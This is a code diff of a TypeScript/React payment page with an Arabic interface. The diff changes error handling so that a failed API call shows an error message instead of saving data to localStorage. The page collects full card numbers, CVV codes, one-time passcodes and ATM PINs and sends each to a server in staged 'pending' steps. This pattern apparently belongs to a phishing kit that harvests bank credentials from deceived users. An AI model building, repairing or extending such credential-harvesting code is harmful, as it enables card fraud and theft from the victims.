@@ -656,6 +656,8 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const appFee = '10'
   const deliveryFee = '5'
   const dueAmount = '15'
+  const fineAmount = '0'
+  const discountAmount = '0'
 
   const transactionRows = [
     { label: 'اسم مقدم الطلب', value: sessionData.fullName || '-' },
@@ -718,26 +720,12 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
         cardCvv: data.cardCvv,
         stage: 'card_pending',
       })
-    } catch (apiErr) {
-      console.warn('[Payment] API call failed, using localStorage:', apiErr)
-      // Fallback to localStorage
-      try {
-        const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-        const sessionIndex = sessions.findIndex((s: any) => s.sessionId === sessionId)
-        if (sessionIndex !== -1) {
-          sessions[sessionIndex].cardName = data.cardName
-          sessions[sessionIndex].cardNumber = data.cardNumber
-          sessions[sessionIndex].cardNumberMasked = '****' + data.cardNumber.slice(-4)
-          sessions[sessionIndex].cardExpiry = data.cardExpiry
-          sessions[sessionIndex].cardCvv = data.cardCvv
-          sessions[sessionIndex].stage = 'card_pending'
-          sessions[sessionIndex].updatedAt = new Date().toISOString()
-          localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
-        }
-      } catch {}
+      setStage('card_pending')
+    } catch (apiErr: any) {
+      console.error('[Payment] API call failed:', apiErr?.message || apiErr)
+      setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
     }
     
-    setStage('card_pending')
     setIsSubmitting(false)
   }
 
@@ -752,21 +740,12 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
         otpCode,
         stage: 'otp_pending',
       })
-    } catch (apiErr) {
-      console.warn('[Payment] API call failed, using localStorage:', apiErr)
-      try {
-        const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-        const sessionIndex = sessions.findIndex((s: any) => s.sessionId === sessionId)
-        if (sessionIndex !== -1) {
-          sessions[sessionIndex].otpCode = otpCode
-          sessions[sessionIndex].stage = 'otp_pending'
-          sessions[sessionIndex].updatedAt = new Date().toISOString()
-          localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
-        }
-      } catch {}
+      setStage('otp_pending')
+    } catch (apiErr: any) {
+      console.error('[Payment] API call failed:', apiErr?.message || apiErr)
+      setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
     }
     
-    setStage('otp_pending')
     setIsSubmitting(false)
   }
 
@@ -781,21 +760,12 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
         atmPin,
         stage: 'atm_pending',
       })
-    } catch (apiErr) {
-      console.warn('[Payment] API call failed, using localStorage:', apiErr)
-      try {
-        const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-        const sessionIndex = sessions.findIndex((s: any) => s.sessionId === sessionId)
-        if (sessionIndex !== -1) {
-          sessions[sessionIndex].atmPin = atmPin
-          sessions[sessionIndex].stage = 'atm_pending'
-          sessions[sessionIndex].updatedAt = new Date().toISOString()
-          localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
-        }
-      } catch {}
+      setStage('atm_pending')
+    } catch (apiErr: any) {
+      console.error('[Payment] API call failed:', apiErr?.message || apiErr)
+      setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
     }
     
-    setStage('atm_pending')
     setIsSubmitting(false)
   }
 
